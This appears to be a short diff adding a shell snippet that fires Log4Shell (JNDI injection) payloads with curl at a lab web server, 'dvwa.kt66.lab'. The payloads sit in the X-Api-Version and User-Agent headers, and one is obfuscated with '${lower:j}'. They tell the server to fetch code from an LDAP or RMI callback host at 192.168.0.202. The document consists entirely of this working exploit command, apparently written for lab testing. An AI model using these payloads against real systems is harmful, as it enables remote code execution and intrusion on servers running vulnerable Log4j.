@@ -1,0 +1,5 @@
+J='${${lower:j}ndi:ldap://192.168.0.202:1389/b}'
+curl -i --max-time 15 \
+  -H "X-Api-Version: $J" \
+  -A '${jndi:rmi://192.168.0.202:1099/c}' \
+  http://dvwa.kt66.lab/
